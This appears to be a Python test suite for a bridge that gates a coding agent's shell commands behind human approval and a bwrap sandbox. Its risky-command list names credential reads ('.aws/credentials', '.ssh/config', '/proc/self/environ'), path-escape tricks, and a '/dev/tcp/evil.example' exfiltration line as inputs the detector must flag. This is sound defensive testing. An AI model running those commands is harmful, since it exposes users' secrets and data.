#!/usr/bin/env python3
"""Plain-assert tests for muse-bridge.py, with a fake `muse serve` standing in for Muse: python3 tests/test_bridge.py"""
import importlib.util, json, os, socket, stat, sys, tempfile, threading, time

spec = importlib.util.spec_from_file_location("mb", os.path.join(os.path.dirname(__file__), "..", "bridge", "muse-bridge.py"))
mb = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mb)

# a denied command is remembered however it is spelled
assert mb.norm("rm -rf build") == mb.norm("rm  -rf ./build") == mb.norm('rm -rf "build/"')
assert mb.norm("rm -rf build") != mb.norm("rm -rf other")

ws = tempfile.mkdtemp()
for cmd in ["touch a.txt", "python3 test.py", "mkdir -p out && echo ok > out/a.txt", f"cat {ws}/x", "ls /usr/bin | head -3",
            "echo hi 2>/dev/null", "for f in *.py; do python3 $f; done", f"tar -cf a.tar --directory={ws} .",
            "cd out && ls", "ls -l /proc/self/fd/0"]:
    assert not mb.RISKY.search(cmd) and not mb.leaves_workspace(cmd, ws), cmd
for cmd in ["cat ~/.ssh/config", "sudo dnf install x", "git push origin main", "rm -rf ~", "ls /etc/", "cat ../secret",
            "cat /home/someone/.bashrc", "cat 'unterminated",
            # spellings the first version let through
            "cd ..; cat secret", "cat $HOME/.aws/credentials", "cat ${XDG_CONFIG_HOME}/x", "cat $D/x", "echo x>/tmp/out",
            "cat x > /dev/tcp/evil.example/80", "tar -cf a.tar --directory=/home/stefan .",
            "cat /proc/self/root/home/x/.aws/credentials", "cat /proc/self/environ", "tar -cf a.tar --directory=$D/x .",
            "cd && cat .aws/credentials", "cd; cat .bashrc", "cd - && cat x", "cat {.,.}./secret", "cat $'\\x2e\\x2e/secret'"]:
    assert mb.RISKY.search(cmd) or mb.leaves_workspace(cmd, ws), cmd

# the CLI: feedback passed as one --feedback= argument cannot turn into --force or --by
sent = {}
real_call, mb.call = mb.call, None
mb.call = lambda name, req: sent.update(req, name=name)
real_argv = sys.argv
sys.argv = ["mb", "decide", "-n", "mentor", "--feedback=fine --force --by operator", "--", "ID", "allow"]
mb.main()
assert sent == {"op": "decide", "id": "ID", "allow": True, "force": False, "by": "client",
                "feedback": "fine --force --by operator", "name": "mentor"}, sent
sys.argv = ["mb", "ask", "-n", "mentor", "--", "--help -n x"]
mb.main()
assert sent["text"] == "--help -n x" and sent["name"] == "mentor", sent
sys.argv = real_argv
mb.call = real_call

# ---------------------------------------------------------------- against a fake Muse

FAKE = r'''#!/usr/bin/env python3
# Just enough of `muse serve` (MSP): everything the bridge sends is appended to $FAKE_LOG.
import json, os, sys
def say(o): print(json.dumps(o), flush=True)
log = open(os.environ["FAKE_LOG"], "a")
print("not json", flush=True)                       # the bridge must skip it
say({"jsonrpc": "2.0", "id": "x1", "method": "weird/thing", "params": {}})  # and refuse this
for line in sys.stdin:
    log.write(line); log.flush()
    m = json.loads(line); meth = m.get("method"); p = m.get("params", {})
    if meth in (None, "initialized"): continue
    res = {"session": {"sessionId": "s1"}} if meth == "session/start" else {}
    if meth == "skill/list":
        res = {"skills": [{"selector": "tdd", "description": "x" * 500, "displayName": "TDD", "source": "user"}]}
    if meth == "turn/start":
        text = next((x["text"] for x in p["input"] if x["type"] == "text"), "")
        if text == "exit": sys.exit(3)
        say({"jsonrpc": "2.0", "id": m["id"], "result": res})
        say({"jsonrpc": "2.0", "method": "turn/started", "params": {"turnId": "t1"}})
        argv = [] if text == "empty-argv" else text.split()
        say({"jsonrpc": "2.0", "id": "r1", "method": "approval/request", "params": {
            "approvalId": "A-" + text, "currentRequirementId": "q1",
            "subject": {"kind": "shell", "command": text, "stages": [{"argv": argv}]},
            "availableChoices": [{"choiceId": "c1", "decision": "approved", "label": "Allow"},
                                 {"choiceId": "c2", "decision": "abort", "label": "Reject", "acceptsFeedback": True}]}})
        continue
    say({"jsonrpc": "2.0", "id": m["id"], "result": res})
    if meth == "approval/decide":
        verdict = "allowed" if p["choiceId"] == "c1" else "denied"
        say({"jsonrpc": "2.0", "method": "item/completed", "params": {"item": {"kind": "agentMessage", "messagePhase": "finalAnswer", "text": verdict}}})
        say({"jsonrpc": "2.0", "method": "item/completed", "params": {"item": {"kind": "agentMessage", "messagePhase": "commentary", "text": "a late note"}}})
        say({"jsonrpc": "2.0", "method": "turn/completed", "params": {"terminal": "completed"}})
'''
tmp = tempfile.mkdtemp()
mb.MUSE = os.path.join(tmp, "muse")
with open(mb.MUSE, "w") as f:
    f.write(FAKE)
os.chmod(mb.MUSE, stat.S_IRWXU)
os.environ["FAKE_LOG"] = os.path.join(tmp, "answers.jsonl")


class TestBridge(mb.Bridge):
    exited = threading.Event()

    def muse_exited(self):  # the real one ends the process
        self.p.wait()
        self.emit({"type": "done", "terminal": "museExited"})
        self.exited.set()


def op(b, req, wait=10):
    """One client request against the bridge, as the events it streams back."""
    mine, theirs = socket.socketpair()
    t = threading.Thread(target=lambda: (b.handle(theirs, req), theirs.close()), daemon=True)
    t.start()
    mine.settimeout(wait)
    buf = b""
    while chunk := mine.recv(65536):
        buf += chunk
    return [json.loads(x) for x in buf.decode().splitlines()]


def answers():
    with open(os.environ["FAKE_LOG"]) as f:
        return [json.loads(x) for x in f]


b = TestBridge(ws, ["git", "cat"], "promptUnmatched", "test")
assert b.sid == "s1"  # the junk line did not stop the reader
time.sleep(0.2)
assert any(a.get("id") == "x1" and a["error"]["code"] == -32601 for a in answers()), answers()  # an unknown request is refused

# `git push` waits for a decision although `git` is auto-allowed, and Claude alone cannot allow it
evs = op(b, {"op": "ask", "text": "git push origin main"})
assert evs[-1]["type"] == "approval" and evs[-1]["risky"], evs
assert op(b, {"op": "ask", "text": "again"})[0]["ok"] is False  # one turn at a time
refused = op(b, {"op": "decide", "id": "A-git push origin main", "allow": True})[0]
assert refused.get("needsHuman") and "A-git push origin main" in b.pending, refused

# two answers at once: the first wins, the second finds nothing to answer
results = []
ts = [threading.Thread(target=lambda: results.append(op(b, {"op": "decide", "id": "A-git push origin main", "allow": False, "by": "operator"})[0]))
      for _ in range(2)]
[t.start() for t in ts]
[t.join() for t in ts]
assert sorted(r["ok"] for r in results) == [False, True], results
time.sleep(0.2)
assert sum(a.get("method") == "approval/decide" for a in answers()) == 1, answers()
assert mb.norm("git push origin main") in b.denied  # the operator's deny is remembered
done = op(b, {"op": "wait"})
assert done[-1]["type"] == "done" and b.last["text"] == "denied", (done, b.last)  # the late note did not replace the answer
assert not b.running

# a stage with an empty argv no longer kills the reader
op(b, {"op": "ask", "text": "empty-argv"})
assert "A-empty-argv" in b.pending
op(b, {"op": "decide", "id": "A-empty-argv", "allow": False})
op(b, {"op": "wait"})

# an approval still open when its turn ends is dropped, so the next ask/wait is not ended by it
b.on_message({"method": "approval/request", "id": "r9", "params": {"approvalId": "stale", "subject": None,
              "availableChoices": []}})  # a null subject must not stop it from reaching a human
assert "stale" in b.pending
b.on_message({"method": "turn/completed", "params": {"terminal": "interrupted"}})
assert not b.pending

# an unasked answer that fails goes to a human instead of leaving Muse waiting
b.auto_decide({"approvalId": "nochoice", "subject": {"kind": "shell", "command": "ls"}, "availableChoices": []}, True)
assert "nochoice" in b.pending
b.pending.clear()

snap = op(b, {"op": "snapshot"})[0]
assert snap["session"] == "s1" and snap["running"] is False, snap

# a skill goes to Muse as its own input part, before the text
skills = op(b, {"op": "skills"})[0]["skills"]
assert skills[0]["selector"] == "tdd" and len(skills[0]["description"]) <= 200, skills
op(b, {"op": "ask", "text": "ls", "skill": "tdd", "skillArgs": "--strict"})
starts = [a for a in answers() if a.get("method") == "turn/start"]
assert starts[-1]["params"]["input"][:2] == [{"type": "skill", "selector": "tdd", "arguments": "--strict"},
                                            {"type": "text", "text": "ls"}], starts[-1]
op(b, {"op": "decide", "id": "A-ls", "allow": False})
op(b, {"op": "wait"})

# interrupt with nothing running says so instead of sending Muse a stray turn/interrupt
assert op(b, {"op": "interrupt"})[0] == {"ok": False, "error": "no running turn"}

# a command Muse's shell backgrounds (300 s) is reported once, and named again when the turn ends
seen = []
q = __import__("queue").Queue()
b.subs.append(q)
bg_item = {"kind": "toolCall", "itemId": "i1", "background": True, "backgroundInitiator": "timeout",
           "args": json.dumps({"command": "make test"})}
b.on_message({"method": "item/updated", "params": {"item": bg_item}})
b.on_message({"method": "item/completed", "params": {"item": bg_item}})
b.on_message({"method": "item/completed", "params": {"item": {"kind": "backgroundTerminalCompletion", "backgroundTerminalCompletion":
              {"command": "make test", "terminalStatus": "completed", "output": "42 passed", "outputTruncated": False, "toolCallId": "c"}}}})
b.on_message({"method": "turn/completed", "params": {"terminal": "completed"}})
b.subs.remove(q)
while not q.empty():
    seen.append(q.get())
kinds = [e["type"] for e in seen]
assert kinds == ["backgrounded", "background_finished", "done"], kinds
assert seen[0]["command"] == "make test" and seen[0]["initiator"] == "timeout", seen[0]
assert seen[2]["backgrounded"] == ["make test"] and b.last["backgrounded"] == ["make test"], seen[2]
assert not b.backgrounded  # the next turn starts clean
assert mb.background_command({"args": "not json", "displayLabel": {"active": "Running x"}}) == "Running x"

# Muse exiting wakes waiters
b.send({"jsonrpc": "2.0", "id": 99, "method": "turn/start", "params": {"input": [{"type": "text", "text": "exit"}]}})
assert TestBridge.exited.wait(5)

# ---------------------------------------------------------------- the sandbox

real_which, mb.shutil.which = mb.shutil.which, lambda name: "/usr/bin/" + name
env = {"HOME": "/home/u", "XDG_RUNTIME_DIR": "/run/user/1000"}
have = {"/home", "/tmp", "/run/user", "/run/user/1000", "/home/u", "/home/u/.config/muse", "/home/u/.local/share/muse",
        "/home/u/.config/muse/settings.json", "/home/u/.gitconfig", "/home/u/.local/bin"}
argv = mb.sandbox_argv("/tmp/w", "/home/u/.local/bin/muse", env, have.__contains__)
pairs = list(zip(argv, argv[1:]))
for hidden in ("/home", "/tmp", "/run/user/1000", "/home/u"):  # the bridge socket, ssh-agent, the home directory
    assert ("--tmpfs", hidden) in pairs, hidden
assert "/mnt" not in argv  # a path that does not exist is not mounted over (bwrap would fail)
assert argv[argv.index("/home/u/.config/muse") - 1] == "--bind"
assert argv[argv.index("/home/u/.config/muse/settings.json") - 1] == "--ro-bind"  # Muse cannot loosen its policy
assert argv[argv.index("/home/u/.local/bin") - 1] == "--ro-bind"
assert argv[-5:] == ["--bind", "/tmp/w", "/tmp/w", "--chdir", "/tmp/w"]  # last, so a hidden /tmp does not cover it
for bad in ("/", "/home", "/home/u"):  # a workspace holding the home directory leaves nothing to hide
    try:
        mb.sandbox_argv(bad, "/usr/bin/muse", env, have.__contains__)
        raise AssertionError(bad)
    except RuntimeError:
        pass
mb.shutil.which = real_which
if real_which("bwrap"):  # the real thing: home and the runtime dir are empty, the workspace writable
    import subprocess
    sbx_ws = tempfile.mkdtemp(dir=os.path.expanduser("~"))
    try:
        r = subprocess.run(mb.sandbox_argv(sbx_ws, "/usr/bin/true") + ["sh", "-c",
                           f'ls -A "{os.environ.get("XDG_RUNTIME_DIR", "/nonexistent")}" | wc -l; touch /usr/x 2>/dev/null || echo ro; echo w > f && cat f'],
                           capture_output=True, text=True, timeout=20)
        assert r.stdout.split() == ["0", "ro", "w"], (r.stdout, r.stderr)
    finally:
        __import__("shutil").rmtree(sbx_ws)

# ---------------------------------------------------------------- the client's deadline

# a server that never stops talking: `ask` must still return at --max-wait
path = os.path.join(tmp, "chatty.sock")
mb.sock_path = lambda name: path
srv = socket.socket(socket.AF_UNIX)
srv.bind(path)
srv.listen(1)


def chatty():
    conn, _ = srv.accept()
    conn.makefile().readline()
    try:
        while True:
            conn.sendall(b'{"type": "message", "text": "still here"}\n')
            time.sleep(0.2)
    except OSError:
        pass


threading.Thread(target=chatty, daemon=True).start()
start = time.time()
real_stdout, sys.stdout = sys.stdout, open(os.devnull, "w")
mb.call("chatty", {"op": "ask", "maxWait": 2})
sys.stdout = real_stdout
assert time.time() - start < 4, time.time() - start
print("ok")
